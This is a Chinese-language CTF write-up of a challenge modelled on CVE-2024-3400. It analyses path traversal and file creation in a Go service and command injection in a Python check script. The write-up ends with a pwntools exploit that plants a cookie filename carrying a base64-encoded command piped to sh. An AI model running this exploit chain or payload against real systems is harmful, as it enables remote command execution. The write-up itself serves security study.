# check（CVE-2024-3400

由 Go 语言编写的 Web 服务和一个 Python 完整性检查脚本。通过分析可以发现，服务端存在目录遍历和任意文件创建漏洞，结合 Python 脚本中的命令注入漏洞，最终可以实现远程命令执行（RCE）。

#### **漏洞分析**

攻击链主要由三个关键漏洞串联而成：

**1. 任意文件创建**

漏洞点位于 `main_PreCheck` 函数。该函数名具有欺骗性，其真实作用并非“检查”，而是创建一个文件。

```c
void __golang main_PreCheck(string_0 path, error_0 _r0)
{
  os_File_0 *v2; // rsi
  error_0 v3; // r8
  os_file_0 **v4; // rax

  os_OpenFile(path, 64, 0x1A4u, v2, v3);
  if ( !path.len )
  {
    if ( v4 )
      os__ptr_file_close(*v4, *(error_0 *)&path.len);
  }
}
```
当 `main_validateCookie` 函数被调用时，它会使用用户传入的 Cookie 值构造一个路径，并调用 `main_PreCheck`，从而在服务器上创建一个空的、由用户指定路径的文件。

**2. 目录遍历 **

漏洞点位于 `validateCookie` 函数中，`cookieName` 完全由用户控制。

```c
void __golang main_validateCookie(string_0 cookieName, bool _r0)
{
...

  v10 = 9;
  v9.len = (int)&byte_72680E;
  v11 = cookieName;
  v14.array = (string_0 *)&v9.len;
  v14.len = 2;
  v14.cap = 2;
  path_filepath_join(v14, v2);
  v9.str = (uint8 *)v14.array;
  name = 2;
  main_PreCheck(*(string_0 *)&v14.array, *(error_0 *)((char *)&v2 - 8));
  if ( !v14.array )
  {
    v12.str = v9.str;
    v12.len = name;
    os_ReadFile(v12, *(_slice_uint8_0 *)((char *)&v2 - 8), v4, v6, *(error_0 *)v7);
    if ( !v2.str )
    {
      v13.len = (int)v5;
      runtime_slicebytetostring((runtime_tmpBuf *)&v7[8], v5, name, v2);
      strings_TrimSpace(v13, *(string_0 *)((char *)&v2 - 8));
    }
  }
}
```
`path_filepath_join` 会解析路径，如果 `cookieName` 包含 `../`，则 `cookiePath` 就会指向 `COOKIE_DIR` 的上级目录。例如，若 `cookieName` 为 `../../etc/passwd`，则 `cookiePath` 就会变成 `/etc/passwd`，结合漏洞点1，即可在任意位置创建文件。

**3. 命令注入**

该漏洞存在于 `check.py` 脚本中。该脚本在清理非法文件时，直接将文件名拼接到 `rm -f` 命令中，并使用 `shell=True` 执行。

```python
# check.py (简化)
delete_cmd = f"rm -f {self.base_dir}/{fname}"
subprocess.run(
    delete_cmd,
    shell=True,
    #...
)
```
如果一个文件名包含 shell 特殊字符（如 `|`, `&&`, `;`），就会导致命令注入。

## exp

```python
#!/usr/bin/env python3
from pwn import *

target_host = "127.0.0.1"
target_port = 8888

r = remote(target_host, target_port)
r.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
response = r.recvuntil(b"\r\n\r\n", timeout=2)
cookie = None
for line in response.split(b"\r\n"):
    if b"Set-Cookie: session=" in line:
        cookie = line.split(b"session=")[1].split(b";")[0].decode()
        break

filename = "../123|echo Y2F0IC9mbGFnID4gLi9mbGFn | base64 -d | sh"

payload = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nCookie: session={filename}\r\n\r\n"
r.send(payload.encode())
r.recvuntil(b"\r\n\r\n", timeout=2)

payload = f"GET /check HTTP/1.1\r\nHost: {target_host}\r\nCookie: session={cookie}\r\n\r\n"
r.send(payload.encode())
try:
    r.recv(timeout=2)
except:
    pass
r.interactive()
```

